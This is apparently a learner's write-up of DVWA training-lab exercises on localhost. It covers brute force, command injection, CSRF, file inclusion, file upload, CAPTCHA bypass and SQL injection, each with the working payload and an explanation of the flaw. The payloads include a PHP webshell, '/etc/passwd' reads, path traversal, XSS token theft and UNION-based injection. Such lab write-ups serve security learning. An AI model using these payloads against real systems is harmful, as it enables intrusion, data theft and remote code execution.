
### 1. Brute Force


#### Security Level: Low

**Payload Used:**

I used Burp Suite's Intruder to brute force the login form. The login page sends credentials via GET parameters, which makes it easy to automate.

I loaded a common password wordlist (`rockyou.txt`) into Burp Intruder and ran the attack. 

**Result:** Successfully brute forced the password. The response for the correct password contained "Welcome to the password protected area" while wrong attempts showed "Username and/or password incorrect."

![Brute force low - successful login](screenshots/brute-force-low-result.png)

**Why it worked:** There's absolutely no rate limiting, no account lockout, no CAPTCHA. The server just compares plaintext credentials with every request.

#### Security Level: Medium

**Payload Used:** Same Burp Intruder approach.

**Result:** The attack still works, but it's noticeably slower. Each failed login attempt has a 2-second `sleep()` delay added server-side. The brute force still succeeded, it just took longer.

![Brute force medium - delayed responses](screenshots/brute-force-medium.png)

**Why it partially worked:** The `sleep(2)` delay is annoying but not a real defense. With a good wordlist the password is usually near the top.

#### Security Level: High

**Payload Used:** Same approach, but now there's an anti-CSRF token involved.

Each login request includes a `user_token` parameter, so I can't just replay requests without extracting the token from the previous response first. I extracted the token from each response and feed it into the next request.

**Result:** Still possible to brute force, but significantly harder to automate. Also, there's a random sleep between 0-3 seconds on failed attempts.

![Brute force high - CSRF token in request](screenshots/brute-force-high.png)

**Why it's harder:** The anti-CSRF token means each request depends on the response of the previous one. You can't just blast requests in parallel. Combined with the random delay, it's a real pain but technically still breakable.

---

### 2. Command Injection


#### Security Level: Low

**Payload Used:**

The page asks for an IP address to ping. I entered:

```
127.0.0.1; cat /etc/passwd
```

**Result:** The server ran `ping -c 4 127.0.0.1` AND `cat /etc/passwd`. I got the full contents of the passwd file alongside the ping output.

![Command injection low](screenshots/cmdi-low.png)

**Why it worked:** The PHP code does a straight `shell_exec('ping -c 4 ' . $target)` with zero input filtering. The semicolon terminates the ping command and starts a new one.

#### Security Level: Medium

**Payload Used:**


```
127.0.0.1 | cat /etc/passwd
```

**Result:** Still got the passwd file.

![Command injection medium](screenshots/cmdi-medium.png)

**Why it worked:** There are other shell metacharacters like `|`, `||`, and backticks that still work.

#### Security Level: High

**Payload Used:**

Tried a bunch of things. Most special characters are stripped. However, I noticed:

```
127.0.0.1|cat /etc/passwd
```

(No space after the pipe)

**Result:** It worked! The high-level code strips `"| "` (pipe with a space) but not `"|"` (pipe without a space).

![Command injection high](screenshots/cmdi-high.png)

**Why it worked:** A proper fix would be to validate that the input is strictly an IP address using a whitelist approach rather than trying to blacklist dangerous characters.

---

### 3. Cross-Site Request Forgery (CSRF)


#### Security Level: Low

**Payload Used:**

The password change form sends a GET request:

```
http://localhost:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change
```

I crafted a simple HTML page that a victim would visit:

```html
<img src="http://localhost:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" style="display:none">
```

**Result:** Opened this HTML file in a browser that was logged into DVWA, the password got changed to "hacked" silently in the background. The image tag will made the GET request automatically.

![CSRF low - password changed](screenshots/csrf-low-result.png)

**Why it worked:** No CSRF token, no `Referer` check, and the form uses GET (which is terrible for state-changing actions). The server blindly processes the request.

#### Security Level: Medium

**Payload Used:**

Now the server checks the `Referer` header, it needs to contain the server's hostname. I hosted my malicious HTML from the DVWA server itself or I could create a page on a domain like `localhost-evil.com` since the check just looks for the string "localhost" anywhere in the Referer.

**Result:** Password was changed again.

![CSRF medium](screenshots/csrf-medium.png)

**Why it worked:** The `Referer` check is too loose. It only checks if the server name appears anywhere in the Referer string, which is easy to bypass.

#### Security Level: High

**Payload Used:**

The form now includes an anti-CSRF token (`user_token`). To exploit this, I'd need to combine it with another vulnerability (like XSS) to first steal the token from the change password page, then use it to forge the request.

```javascript
// XSS payload to extract token and change password
var xhr = new XMLHttpRequest();
xhr.open('GET', '/vulnerabilities/csrf/', false);
xhr.send();
var token = xhr.responseText.match(/user_token.*?value="(.*?)"/)[1];
// Then make another request with the token
```

**Result:** Requires chaining with another vulnerability (XSS). A standalone CSRF attack won't work because I can't predict the token value.

---

### 4. File Inclusion


#### Security Level: Low

**Payload Used:**

The page loads files via a `page` parameter:

```
http://localhost:8080/vulnerabilities/fi/?page=../../../../../../etc/passwd
```

**Result:** I can read any file on the system. Got the contents of `/etc/passwd` displayed on the page.

![File inclusion low - LFI](screenshots/fi-low-lfi.png)

**Why it worked:** The `page` parameter is directly passed in PHP with no sanitization. Directory sequences (`../`) let me escape the web directory and read system files.

#### Security Level: Medium

**Payload Used:**

The code now strips `http://`, `https://`, `../`, and `..\` from the input. I used a bypass:

```
http://localhost:8080/vulnerabilities/fi/?page=....//....//....//....//etc/passwd
```

When the code removes `../`, it turns `....//` into `../`.

**Result:** Still got `/etc/passwd`.

![File inclusion medium](screenshots/fi-medium.png)

**Why it worked:** It doesn't recursively strip the traversal patterns, so doubling up defeats the filter.

#### Security Level: High

**Payload Used:**

The code now requires that the `page` parameter starts with "file" — so I used the `file://` protocol:

```
http://localhost:8080/vulnerabilities/fi/?page=file:///etc/passwd
```

**Result:** Got the file contents again.

![File inclusion high](screenshots/fi-high.png)

**Why it works:** The check is actually meant to allow only "file1.php", "file2.php" etc but accidentally allows the `file://` wrapper too. It's a wrong implementation.

---

### 5. File Upload


#### Security Level: Low

**Payload Used:**

Created a simple PHP webshell:

```php
<?php system($_GET['cmd']); ?>
```

Saved it as `shell.php` and uploaded it through the form.

**Result:** Upload succeeded with no checks. Then I accessed:

```
http://localhost:8080/hackable/uploads/shell.php?cmd=pwd
```

Got back `/var/www/html/hackable/uploads`. Full remote code execution.

![File upload low - upload](screenshots/upload-low-upload.png)

![File upload low - RCE](screenshots/upload-low-rce.png)

**Why it worked:** There is zero validation. No file type checking and no content validation. The file goes straight into a publicly accessible directory.

---

### 6. Insecure CAPTCHA


#### Security Level: Low

**Payload Used:**

The password change process has two steps. Step 1 verifies the CAPTCHA, Step 2 actually changes the password. I skipped step 1 entirely by sending the step 2 request directly:

```
POST /vulnerabilities/captcha/
step=2&password_new=hacked&password_conf=hacked&Change=Change
```

**Result:** Password changed without ever solving a CAPTCHA.

![Insecure CAPTCHA low](screenshots/captcha-low.png)

**Why it worked:** The server doesn't verify that step 1 was completed before processing step 2. There's no session-based state tracking between the steps.

#### Security Level: Medium

**Payload Used:**

Now there's a hidden field `passed_captcha` that needs to be set to `true` in step 2. I just added it to my request:

```
step=2&password_new=hacked&password_conf=hacked&passed_captcha=true&Change=Change
```

**Result:** Password changed.

![Insecure CAPTCHA medium](screenshots/captcha-medium.png)

**Why it worked:** A hidden form field is client-side data — I can set it to whatever I want. The check `if ($_POST['passed_captcha'])` is trivially bypassable.

#### Security Level: High

**Payload Used:**

The code now checks the CAPTCHA response server-side AND has a backdoor check: if `$_POST['g-recaptcha-response'] == 'hidd3n_valu3'` and the `User-Agent` contains `reCAPTCHA`, it passes. So:

```
POST with:
g-recaptcha-response=hidd3n_valu3
User-Agent: reCAPTCHA
step=1&password_new=hacked&password_conf=hacked&Change=Change
```

**Result:** Password changed using the developer backdoor.

![Insecure CAPTCHA high](screenshots/captcha-high.png)

**Why it worked:** The developers left a hardcoded backdoor in the code (probably for testing). This is a great example of why code review matters — even "secure" code can have intentional backdoors.

---

### 7. SQL Injection


#### Security Level: Low

**Payload Used:**

The User ID input field:

```
1' OR '1'='1
```

To extract more info:

```
1' UNION SELECT user, password FROM users-- -
```

**Result:** The first payload dumped all user records. The UNION based injection gave me all usernames and password hashes from the database.

![SQL injection low - all users](screenshots/sqli-low-allusers.png)

![SQL injection low - union](screenshots/sqli-low-union.png)

**Why it worked:** The PHP code directly concatenates user input into the SQL query. No prepared statements and no input validation whatsoever.
